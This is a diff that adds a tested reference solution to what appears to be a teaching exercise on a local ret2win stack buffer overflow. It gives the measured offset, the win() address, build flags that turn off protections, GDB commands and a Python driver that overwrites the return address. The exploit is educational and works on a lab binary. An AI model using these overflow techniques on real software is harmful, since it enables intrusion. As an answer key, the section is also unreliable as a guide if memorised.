@@ -97,6 +97,65 @@ if result.returncode != 0:
 
 **Expected result:** The program prints <code>[+] WIN: local ret2win demonstration reached win()!</code>. Explain why the address was derived from the local symbol table, why the offset came from the current stack frame, and why this demonstration does not need executable payload bytes. If alignment or address-byte constraints prevent this exact variant in your environment, submit the GDB evidence and explain the constraint rather than guessing values.
 
+#### Reference solution (tested)
+
+This subsection records one verified run of the exercise above. It is a reference point, not a set of constants to copy into a different build.
+
+| Item | Value |
+|---|---|
+| Binary | <code>build/vuln</code> — <code>ELF 32-bit LSB executable, Intel 80386</code> |
+| Offset from <code>&buf</code> to the saved return slot | 76 bytes |
+| <code>win()</code> address | <code>0x0804921f</code> |
+| Toolchain | <code>gcc (Ubuntu 11.4.0-1ubuntu1~22.04.3) 11.4.0</code> on ubuntu 22.04 |
+| Build flags | <code>-Wall -Wextra -Wpedantic -std=c11 -O0 -g -fno-omit-frame-pointer -fno-stack-protector -fno-pie -z execstack -no-pie -m32</code> |
+
+The offset was measured with GDB on the binary being studied:
+
+~~~gdb
+break src/vulnerable.c:31
+run
+print/d (char *)($ebp + 4) - (char *)&buf
+~~~
+
+The symbol address was read from the local symbol table of the same binary:
+
+~~~bash
+nm -n ./build/vuln | grep ' win$'
+~~~
+
+The driver from the exercise, with the measured offset and the local symbol address substituted:
+
+~~~python
+import re
+import subprocess
+
+binary = "./build/vuln"
+offset = 76
+symbols = subprocess.check_output(["nm", "-n", binary], text=True)
+match = re.search(r"^([0-9a-fA-F]+)\s+\w\s+win$", symbols, re.MULTILINE)
+win_address = int(match.group(1), 16)
+file_description = subprocess.check_output(["file", binary], text=True)
+pointer_size = 8 if "ELF 64-bit" in file_description else 4
+address_bytes = win_address.to_bytes(pointer_size, byteorder="little")
+address_prefix = address_bytes.rstrip(b"\x00")
+if not address_prefix or b"\x00" in address_prefix:
+    raise SystemExit("This symbol address is not representable by the argv/strcpy partial-overwrite variant.")
+payload = b"A" * offset + address_prefix
+result = subprocess.run([binary.encode(), payload], check=False)
+if result.returncode != 0:
+    print("The process did not exit normally; check the architecture, measured offset, and GDB observations.")
+~~~
+
+Observed output:
+
+~~~text
+[+] WIN: local ret2win demonstration reached win()!
+~~~
+
+**Addresses vary by build.** <code>win()</code> is linked at a fixed address only for one exact binary. A different compiler version, a different flag set, a 64-bit build, or any edit to <code>src/vulnerable.c</code> moves the symbol, and a different frame layout changes the offset. The address <code>0x0804921f</code> also contains no zero byte, so the argv/strcpy variant above can carry it; a build whose symbol address contains an interior zero byte cannot be driven this way and needs a different delivery mechanism. Re-derive both values from the binary you actually built.
+
+*Tested against commit 2167032d4296ac4da991d948236497b2683c5f5b on ubuntu 22.04 (Docker).*
+
 ### 8. Write a mitigation and remediation report
 
 **Goal:** Explain how source repair and layered binary mitigations change the observed result.
